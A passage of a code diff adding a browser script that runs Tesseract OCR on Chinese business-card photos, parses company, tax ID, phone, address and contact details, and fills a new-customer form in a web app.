+    let text = compactChineseText(name).replace(/(銷售部|業務部|採購部|客服部|設計部|工程部|經理|負責人|聯絡人|職稱)/g, "");
+    if (text === "明遍" && /Hao\s*Ming/i.test(joined)) text = "郝明遍";
+    return text;
+  }
+
+  function findTaxId(lines) {
+    const taxIdRe = /(?<!\d)\d{8}(?!\d)/g;
+    for (const line of lines) {
+      if (!isTaxLine(line)) continue;
+      const text = removePhoneDigits(line);
+      for (const candidate of text.match(/\d[\d\s-]{6,}\d/g) || []) {
+        const digits = candidate.replace(/[^\d]/g, "");
+        if (digits.length === 8) return digits;
+      }
+    }
+    const candidates = [];
+    for (const line of lines) {
+      if (phoneMatches(line).length || /@|www\.|https?:\/\//i.test(line)) continue;
+      if (isAddressLine(line) || /(電話|手機|TEL|Mobile|Phone|Fax|傳真)/i.test(line)) continue;
+      const text = removePhoneDigits(line);
+      for (const digits of text.match(taxIdRe) || []) {
+        if (!candidates.includes(digits)) candidates.push(digits);
+      }
+    }
+    if (candidates.length === 1) return candidates[0];
+    return "";
+  }
+
+  function extractNameFromLine(line, joined) {
+    const compact = compactChineseText(line)
+      .replace(/[A-Za-z0-9@._%+\-:/()（）\s]+/g, "")
+      .replace(ROLE_RE, "")
+      .replace(/(公司|股份|有限|工程行|企業社|商行|名片|地址|電話|手機|統編|統一編號|傳真|網址|職稱)/g, "");
+    const name = normalizeContactName(firstMatch(compact, /([\u4e00-\u9fff]{2,4})/), joined);
+    return name;
+  }
+
+  function findContact(lines, joined) {
+    const badNameRe = /(銷售部|業務部|採購部|客服部|設計部|工程部|經理|負責人|聯絡人|公司|有限|股份|名片|地址|電話|手機)/;
+    let role = "";
+    for (const line of lines) {
+      role = detectRole(line);
+      if (role) break;
+    }
+    for (const line of lines) {
+      const phones = phoneMatches(line);
+      if (!phones.some((phone) => phone.startsWith("09"))) continue;
+      const withoutPhones = removePhoneDigits(line);
+      if (isAddressLine(withoutPhones)) continue;
+      const name = extractNameFromLine(withoutPhones, joined);
+      if (name && !badNameRe.test(name)) return { name, role };
+    }
+    for (const line of lines) {
+      if (scoreCompanyLine(line) >= 4 || phoneMatches(line).length || /@|www\.|https?:\/\//i.test(line)) continue;
+      if (isAddressLine(line) || isTaxLine(line)) continue;
+      const compact = compactChineseText(line).replace(/[A-Za-z\s.-]+/g, "");
+      const withoutRole = compact.replace(ROLE_RE, "");
+      const name = normalizeContactName(firstMatch(withoutRole || compact, /([\u4e00-\u9fff]{2,4})/), joined);
+      if (name && !badNameRe.test(name) && !badNameRe.test(withoutRole || compact)) return { name, role };
+    }
+    const name = normalizeContactName(firstMatch(joined, /(?:負責人|聯絡人|姓名|Name)\s*[:：]?\s*([\u4e00-\u9fff]{2,4})/i), joined);
+    return { name, role };
+  }
+
+  function parseCardText(text) {
+    const lines = splitLines(text);
+    const joined = lines.join("\n");
+    const company = compactChineseText(findCompanyLine(lines));
+    const contact = findContact(lines, joined);
+    const email = firstMatch(joined, /[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/i);
+    const phone = findPhone(lines, false);
+    const mobile = findPhone(lines, true);
+    return {
+      name: company,
+      phone,
+      address: compactChineseText(cleanAddressCandidate(findAddressLine(lines))),
+      company_name: company,
+      tax_id: findTaxId(lines),
+      invoice_title: "",
+      contacts: [
+        {
+          name: contact.name,
+          role: contact.role,
+          phone: mobile || phone,
+          email,
+          notes: "",
+          primary: true,
+        },
+      ],
+      notes: "",
+      is_active: true,
+    };
+  }
+
+  function parsedQualityScore(customer) {
+    if (!customer) return 0;
+    const contact = customer.contacts && customer.contacts[0] ? customer.contacts[0] : {};
+    let score = 0;
+    if (customer.company_name) score += 3;
+    if (customer.phone) score += 2;
+    if (customer.address) score += 2;
+    if (customer.tax_id) score += 2;
+    if (contact.name) score += 2;
+    if (contact.phone) score += 1;
+    if (contact.email) score += 1;
+    return score;
+  }
+
+  window.__parseCustomerCardText = parseCardText;
+
+  function isCustomerCreateRoute() {
+    const hash = String(location.hash || "").replace(/^#/, "");
+    return hash === "/customers/new" || hash.startsWith("/customers/new?");
+  }
+
+  function customerForm() {
+    if (!isCustomerCreateRoute()) return null;
+    return document.querySelector('form[onsubmit^="saveCustomer"]');
+  }
+
+  function formField(form, name) {
+    return form && form.elements ? form.elements[name] : null;
+  }
+
+  function setField(form, name, value) {
+    const target = formField(form, name);
+    if (!target || value === undefined || value === null) return;
+    target.value = value;
+    target.dispatchEvent(new Event("input", { bubbles: true }));
+    target.dispatchEvent(new Event("change", { bubbles: true }));
+  }
+
+  function fillForm(customer) {
+    const form = customerForm();
+    if (!form || !customer) return false;
+    const contact = customer.contacts && customer.contacts[0] ? customer.contacts[0] : {};
+    setField(form, "name", customer.name);
+    setField(form, "phone", customer.phone);
+    setField(form, "address", customer.address);
+    setField(form, "company_name", customer.company_name);
+    setField(form, "tax_id", customer.tax_id);
+    setField(form, "invoice_title", "");
+    setField(form, "contact_name_0", contact.name);
+    setField(form, "contact_role_0", contact.role);
+    setField(form, "contact_phone_0", contact.phone);
+    setField(form, "contact_email_0", contact.email);
+    setField(form, "contact_notes_0", "");
+    setField(form, "notes", "");
+    ensureCustomerFieldTools();
+    return true;
+  }
+
+  function updateStatus(text, mode) {
+    const status = document.getElementById("ocr-modal-status");
+    if (status) {
+      status.textContent = text;
+      status.dataset.mode = mode || "";
+    }
+  }
+
+  function updateProgress(percent) {
+    const wrap = document.getElementById("ocr-progress-wrap");
+    const bar = document.getElementById("ocr-progress-bar");
+    if (!wrap || !bar) return;
+    wrap.style.display = "block";
+    bar.style.width = `${Math.max(0, Math.min(100, percent))}%`;
+  }
+
+  function setInputValue(target, value) {
+    if (!target) return;
+    target.value = value || "";
+    target.dispatchEvent(new Event("input", { bubbles: true }));
+    target.dispatchEvent(new Event("change", { bubbles: true }));
+  }
+
+  window.swapCustomerPhoneFields = function () {
+    const form = customerForm();
+    const companyPhone = formField(form, "phone");
+    const contactPhone = formField(form, "contact_phone_0");
+    if (!companyPhone || !contactPhone) return;
+    const original = companyPhone.value;
+    setInputValue(companyPhone, contactPhone.value);
+    setInputValue(contactPhone, original);
+  };
+
+  window.openCustomerCompanySearch = function (mode) {
+    const form = customerForm();
+    const company = clean(formField(form, "company_name")?.value || formField(form, "name")?.value || "");
+    if (!company) {
+      updateStatus("請先填入公司名稱，再按 Google 查證。", "warn");
+      return;
+    }
+    const suffix = mode === "tax" ? "統一編號" : "地址 電話";
+    window.open(`https://www.google.com/search?q=${encodeURIComponent(`${company} ${suffix}`)}`, "_blank", "noopener,noreferrer");
+  };
+
+  function addFieldTool(inputName, key, text, onClick, title) {
+    const form = customerForm();
+    const input = formField(form, inputName);
+    if (!input) return;
+    const wrap = input.closest(".field");
+    if (!wrap || wrap.querySelector(`[data-ocr-field-tool="${key}"]`)) return;
+    const tools = document.createElement("div");
+    tools.className = "ocr-inline-tools";
+    tools.dataset.ocrFieldTool = key;
+    const button = document.createElement("button");
+    button.className = "btn outline sm";
+    button.type = "button";
+    button.textContent = text;
+    if (title) button.title = title;
+    button.addEventListener("click", onClick);
+    tools.appendChild(button);
+    input.insertAdjacentElement("afterend", tools);
+  }
+
+  function ensureCustomerFieldTools() {
+    addFieldTool("phone", "swap-company-phone", "交換電話", window.swapCustomerPhoneFields, "交換公司電話與第一位聯絡人的電話");
+    addFieldTool("contact_phone_0", "swap-contact-phone", "交換電話", window.swapCustomerPhoneFields, "交換公司電話與第一位聯絡人的電話");
+    addFieldTool("company_name", "google-company-address", "Google 查地址", () => window.openCustomerCompanySearch("address"), "用公司名稱查地址與電話");
+    addFieldTool("tax_id", "google-company-tax", "Google 查統編", () => window.openCustomerCompanySearch("tax"), "用公司名稱查統一編號");
+  }
+
+  function applyParsedText(text) {
+    const parsed = parseCardText(text);
+    const raw = document.getElementById("ocr-raw-text");
+    if (raw) raw.value = splitLines(text).join("\n") || normalizeText(text);
+    if (!parsed.company_name) {
+      updateStatus("有讀到文字，但找不到公司名稱。請修正文字後再整理一次。", "warn");
+      return false;
+    }
+    fillForm(parsed);
+    updateStatus("已填入新增客戶表單，請確認欄位後再儲存。", "ok");
+    return true;
+  }
+
+  window.applyCustomerCardText = function () {
+    const raw = document.getElementById("ocr-raw-text");
+    if (raw) applyParsedText(raw.value);
+  };
+
+  window.loadCustomerCardSample = function () {
+    const sample = [
+      "銷售部 經理",
+      "郝 明 遍",
+      "Hao Ming-bian",
+      "硬名片股份有限公司",
+      "台中市名片區名片路100號 04-12345678 0912-123456",
+      "service@1112345.com",
+      "www.sample.com",
+    ].join("\n");
+    const raw = document.getElementById("ocr-raw-text");
+    if (raw) raw.value = sample;
+    applyParsedText(sample);
+  };
+
+  function loadTesseract() {
+    if (window.Tesseract) return Promise.resolve(window.Tesseract);
+    return new Promise((resolve, reject) => {
+      const script = document.createElement("script");
+      script.src = TESSERACT_SRC;
+      script.onload = () => resolve(window.Tesseract);
+      script.onerror = () => reject(new Error("OCR 套件載入失敗"));
+      document.head.appendChild(script);
+    });
+  }
+
+  function loadImage(file) {
+    return new Promise((resolve, reject) => {
+      const url = URL.createObjectURL(file);
+      const image = new Image();
+      image.onload = () => {
+        URL.revokeObjectURL(url);
+        resolve(image);
+      };
+      image.onerror = () => {
+        URL.revokeObjectURL(url);
+        reject(new Error("圖片讀取失敗"));
+      };
+      image.src = url;
+    });
+  }
+
+  function canvasToBlob(canvas) {
+    return new Promise((resolve) => canvas.toBlob(resolve, "image/png", 0.96));
+  }
+
+  async function preprocessImage(file, options = {}) {
+    const source = await loadImage(file);
+    const sw = source.naturalWidth || source.width;
+    const sh = source.naturalHeight || source.height;
+    const scale = Math.max(1, Math.min(3, 2400 / Math.max(1, Math.max(sw, sh))));
+    const canvas = document.createElement("canvas");
+    canvas.width = Math.round(sw * scale);
+    canvas.height = Math.round(sh * scale);
+    const context = canvas.getContext("2d", { willReadFrequently: true });
+    context.fillStyle = "#fff";
+    context.fillRect(0, 0, canvas.width, canvas.height);
+    context.imageSmoothingEnabled = true;
+    context.imageSmoothingQuality = "high";
+    context.drawImage(source, 0, 0, canvas.width, canvas.height);
+    const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+    let total = 0;
+    for (let i = 0; i < data.length; i += 4) total += 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
+    const mean = total / (data.length / 4);
+    for (let i = 0; i < data.length; i += 4) {
+      const gray = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
+      let value = (gray - mean) * 1.6 + mean + 8;
+      if (value > 236) value = 255;
+      if (value < 38) value = 0;
+      if (options.invert) value = 255 - value;
+      value = Math.max(0, Math.min(255, value));
+      data[i] = value;
+      data[i + 1] = value;
+      data[i + 2] = value;
+    }
+    context.putImageData(imageData, 0, 0);
+    return (await canvasToBlob(canvas)) || file;
+  }
+
+  async function recognizeWithTesseract(Tesseract, image, passLabel) {
+    updateStatus(passLabel);
+    const result = await Tesseract.recognize(image, "chi_tra+eng", {
+      preserve_interword_spaces: "1",
+      user_defined_dpi: "300",
+      tessedit_pageseg_mode: "6",
+      logger(message) {
+        if (message.progress) updateProgress(Math.round(message.progress * 100));
+        if (message.status) updateStatus(`辨識中：${message.status}`);
+      },
+    });
+    return normalizeText(result?.data?.text || "");
+  }
+
+  async function recognizeFile(file) {
+    if (!file) {
+      updateStatus("請先選擇或拖入名片圖片。", "warn");
+      return;
+    }
+    const preview = document.getElementById("ocr-preview");
+    if (preview) {
+      preview.src = URL.createObjectURL(file);
+      preview.style.display = "block";
+    }
+    const runButton = document.getElementById("ocr-run");
+    if (runButton) runButton.disabled = true;
+    updateProgress(0);
+    updateStatus("正在強化圖片清晰度...");
+    try {
+      const image = await preprocessImage(file);
+      const Tesseract = await loadTesseract();
+      let text = await recognizeWithTesseract(Tesseract, image, "正在載入 OCR 模型，第一次會比較久...");
+      let bestScore = parsedQualityScore(parseCardText(text));
+      if (bestScore < 7) {
+        updateProgress(0);
+        const invertedImage = await preprocessImage(file, { invert: true });
+        const invertedText = await recognizeWithTesseract(Tesseract, invertedImage, "第一輪欄位不足，正在用深色名片模式再讀一次...");
+        const invertedScore = parsedQualityScore(parseCardText(invertedText));
+        if (invertedScore > bestScore) {
+          text = invertedText;
+          bestScore = invertedScore;
+        }
+      }
+      const raw = document.getElementById("ocr-raw-text");
+      if (raw) raw.value = text;
+      if (!text) {
+        updateStatus("沒有辨識到文字，請換一張更清楚、較正面的照片。", "warn");
+        return;
+      }
+      applyParsedText(text);
+    } catch (error) {
+      updateStatus(`辨識失敗：${error.message || error}`, "warn");
+    } finally {
+      if (runButton) runButton.disabled = false;
+    }
+  }
+
+  window.recognizeSelectedCustomerCard = function () {
+    const input = document.getElementById("ocr-file");
+    recognizeFile(input && input.files && input.files[0]);
+  };
+
+  function ensureStyles() {
+    if (document.getElementById(STYLE_ID)) return;
+    const style = document.createElement("style");
+    style.id = STYLE_ID;
+    style.textContent = `
+      .ocr-card-actions{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+      .ocr-inline-tools{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
+      .ocr-inline-tools .btn{min-height:30px;padding:6px 10px;font-size:12px}
+      .ocr-modal-backdrop{position:fixed;inset:0;z-index:9999;display:none;align-items:center;justify-content:center;background:rgba(15,23,42,.48);padding:18px}
+      .ocr-modal-backdrop.is-open{display:flex}
+      .ocr-modal{width:min(900px,100%);max-height:min(760px,calc(100vh - 36px));overflow:auto;background:#fff;border:1px solid #dde1e7;border-radius:8px;box-shadow:0 24px 80px rgba(15,23,42,.28)}
+      .ocr-modal-head{display:flex;justify-content:space-between;align-items:center;gap:14px;padding:18px 20px;border-bottom:1px solid #e5e7eb}
+      .ocr-modal-title{margin:0;font-size:20px;line-height:1.2}
+      .ocr-modal-body{display:grid;grid-template-columns:minmax(0,1fr) minmax(280px,.8fr);gap:18px;padding:20px}
+      .ocr-dropzone{display:grid;place-items:center;min-height:190px;border:1px dashed #aeb6c2;border-radius:8px;background:#fafbfc;padding:18px;text-align:center}
+      .ocr-dropzone.is-drag{border-color:#111827;background:#f0f3f7}
+      .ocr-preview{display:none;width:100%;max-height:280px;object-fit:contain;border:1px solid #dde1e7;border-radius:8px;background:#fff;margin-top:12px}
+      .ocr-modal .field{display:grid;gap:8px;margin-bottom:14px}
+      .ocr-modal label{font-size:14px;font-weight:700;color:#30343b}
+      .ocr-modal textarea{width:100%;border:1px solid #c7ccd5;border-radius:8px;background:#fff;color:#16181d;font:inherit;font-size:15px;padding:11px 12px;outline:none;min-height:220px;resize:vertical;line-height:1.55}
+      .ocr-modal-actions{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-top:12px}
+      .ocr-progress-wrap{display:none;height:10px;border-radius:999px;background:#e5e7eb;overflow:hidden;margin-top:12px}
+      .ocr-progress-bar{height:100%;width:0%;background:#111827;transition:width .16s ease}
+      .ocr-status{color:#6b7280;font-size:14px;line-height:1.5}
+      .ocr-status[data-mode="ok"]{color:#0f766e;font-weight:700}
+      .ocr-status[data-mode="warn"]{color:#b45309;font-weight:700}
+      body.ocr-modal-open{overflow:hidden}
+      @media(max-width:760px){.ocr-modal-backdrop{align-items:flex-start;padding:10px}.ocr-modal{max-height:calc(100vh - 20px)}.ocr-modal-head{align-items:flex-start;flex-direction:column}.ocr-modal-body{grid-template-columns:1fr;padding:16px}.ocr-modal .btn{width:100%}}
+    `;
+    document.head.appendChild(style);
+  }
+
+  function openModal() {
+    ensureModal();
+    document.getElementById(MODAL_ID).classList.add("is-open");
+    document.body.classList.add("ocr-modal-open");
+  }
+
+  function closeModal() {
+    const modal = document.getElementById(MODAL_ID);
+    if (modal) modal.classList.remove("is-open");
+    document.body.classList.remove("ocr-modal-open");
+  }
+
+  function ensureModal() {
+    if (document.getElementById(MODAL_ID)) return;
+    const modal = document.createElement("div");
+    modal.id = MODAL_ID;
+    modal.className = "ocr-modal-backdrop";
+    modal.innerHTML = `
+      <div class="ocr-modal" role="dialog" aria-modal="true" aria-label="名片 OCR 匯入">
+        <div class="ocr-modal-head">
+          <h2 class="ocr-modal-title">名片 OCR 匯入</h2>
+          <button class="btn outline sm" type="button" data-ocr-close>關閉</button>
+        </div>
+        <div class="ocr-modal-body">
+          <div>
+            <div class="ocr-dropzone" id="ocr-dropzone">
+              <div>
+                <strong>拖入名片照片</strong>
+                <div style="margin-top:10px"><input id="ocr-file" type="file" accept="image/*"></div>
+              </div>
+            </div>
+            <img id="ocr-preview" class="ocr-preview" alt="名片預覽">
+            <div id="ocr-progress-wrap" class="ocr-progress-wrap"><div id="ocr-progress-bar" class="ocr-progress-bar"></div></div>
+            <div class="ocr-modal-actions">
+              <button class="btn" id="ocr-run" type="button" onclick="recognizeSelectedCustomerCard()">開始辨識</button>
+              <button class="btn outline" type="button" onclick="loadCustomerCardSample()">範例測試</button>
+            </div>
+            <p id="ocr-modal-status" class="ocr-status" aria-live="polite">選擇圖片後開始辨識。</p>
+          </div>
+          <div>
+            <div class="field">
+              <label for="ocr-raw-text">辨識文字</label>
+              <textarea id="ocr-raw-text" placeholder="可手動修正文字後再整理填入"></textarea>
+            </div>
+            <button class="btn secondary" type="button" onclick="applyCustomerCardText()">整理並填入表單</button>
+          </div>
+        </div>
+      </div>
+    `;
+    modal.addEventListener("click", (event) => {
+      if (event.target === modal || event.target.closest("[data-ocr-close]")) closeModal();
+    });
+    document.body.appendChild(modal);
+
+    const input = document.getElementById("ocr-file");
+    const dropzone = document.getElementById("ocr-dropzone");
+    input.addEventListener("change", () => recognizeFile(input.files && input.files[0]));
+    ["dragenter", "dragover"].forEach((type) => {
+      dropzone.addEventListener(type, (event) => {
+        event.preventDefault();
+        dropzone.classList.add("is-drag");
+      });
+    });
+    ["dragleave", "drop"].forEach((type) => {
+      dropzone.addEventListener(type, (event) => {
+        event.preventDefault();
+        dropzone.classList.remove("is-drag");
+      });
+    });
+    dropzone.addEventListener("drop", (event) => {
+      const file = event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files[0];
+      if (file) {
+        input.files = event.dataTransfer.files;
+        recognizeFile(file);
+      }
+    });
+  }
+
+  function ensurePanel() {
+    const form = customerForm();
+    document.querySelectorAll(".customer-card-import").forEach((panel) => {
+      if (!form || !form.contains(panel)) panel.remove();
+    });
+    if (!form) return;
+    ensureStyles();
+    ensureCustomerFieldTools();
+
+    let panel = document.querySelector(".customer-card-import");
+    if (!panel) {
+      panel = document.createElement("section");
+      panel.className = "card customer-card-import";
+      panel.id = PANEL_ID;
+      panel.innerHTML = `<div class="card-header"><h2>名片資料匯入</h2></div><div class="card-body"><div class="ocr-card-actions"></div></div>`;
+      form.insertBefore(panel, form.firstChild);
+    }
+
+    const header = panel.querySelector(".card-header") || panel;
+    const oldLink = header.querySelector('a[href*="ocr"], a[href*="business-card"]');
+    if (oldLink && !oldLink.dataset.ocrEnhanced) {
+      const button = document.createElement("button");
+      button.className = oldLink.className || "btn outline sm";
+      button.type = "button";
+      button.textContent = "名片 OCR 匯入";
+      button.dataset.ocrOpen = "1";
+      button.addEventListener("click", openModal);
+      oldLink.replaceWith(button);
+    } else if (!header.querySelector("[data-ocr-open]")) {
+      const button = document.createElement("button");
+      button.className = "btn outline sm";
+      button.type = "button";
+      button.textContent = "名片 OCR 匯入";
+      button.dataset.ocrOpen = "1";
+      button.addEventListener("click", openModal);
+      header.appendChild(button);
+    }
+  }
+
+  window.addEventListener("hashchange", () => setTimeout(ensurePanel, 0));
+  document.addEventListener("keydown", (event) => {
+    if (event.key === "Escape") closeModal();
+  });
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", ensurePanel);
+  } else {
+    ensurePanel();
+  }
+  setTimeout(ensurePanel, 100);
+  setTimeout(ensurePanel, 500);
+  const app = document.getElementById("app");
+  if (app) new MutationObserver(() => ensurePanel()).observe(app, { childList: true, subtree: true });
+})();
